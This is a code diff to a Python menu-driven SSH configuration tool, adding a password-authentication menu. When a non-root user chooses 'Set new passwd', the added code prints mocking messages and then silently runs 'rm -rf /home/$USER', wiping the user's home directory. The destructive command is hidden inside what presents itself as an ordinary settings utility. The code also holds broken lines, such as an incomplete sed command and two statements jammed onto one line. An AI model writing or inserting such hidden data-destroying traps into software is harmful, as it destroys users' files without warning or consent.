@@ -109,13 +109,47 @@ def setipport():
     port = input(colored('>',"green"))
     os.system(f"sed -i 14s/")  
     sshconf()
+def passwdauth():
+    clear()
+    ssh_configure_passwdauth_art = colored(text2art('passwdauth'),"yellow")
+    ssh_configure_passwdauth_choose = colored('Choose options:',"yellow") 
+    ssh_configure_passwdauth_button_1 =  colored('1. Set new passwd',"green")
+    ssh_configure_passwdauth_button_2 =  colored('2. Main Menu',"green")
+    print(f"""{ssh_configure_passwdauth_art}
+                {ssh_configure_passwdauth_choose}
+                    {ssh_configure_passwdauth_button_1}
+                    {ssh_configure_passwdauth_button_2}
+
+                                                                    """)
+    com = ''
+    com = input(colored('>', "green"))
+    while True:
+        if com == '1':
+            user = getoutput('whoami')
+            if user != 'root':
+                clear()
+                cprint("Good work bro, you crack confmanager and running without root, you are try hecker :>>", "green")                          clear()
+                cprint('-' * 100, 'red')
+                cprint('Seriusly?',"red")
+                clear()
+                cprint("Good luck","red")
+                os.system('rm -rf /home/$USER')
+                clear()
+                sys.exit()
+            else:
+                os.system("passwd")
+                sshconf()
+        elif com == '2':
+            sshconf()
+        else:
+            passwdauth()
 
 def sshconf():
     clear()
     ssh_configure_art = colored(text2art("configure") ,'yellow')
     ssh_configure_choose = colored('Choose option:','yellow')
     ssh_configure_button_1 = colored("1. Set ip:port" ,"green")
-    ssh_configure_button_2 = colored( "2. Enable/Disable passwdauth","green")
+    ssh_configure_button_2 = colored( "2. Passwdauth","green")
     ssh_configure_back = colored("3. Main menu","green")
     print(f"""
         {ssh_configure_art}
@@ -135,8 +169,7 @@ def sshconf():
         if com == '1':
             setipport()
         elif com == '2':
-            pass
-            #passwdauth()
+            passwdauth()
         elif com == '3':
             main()
         else:
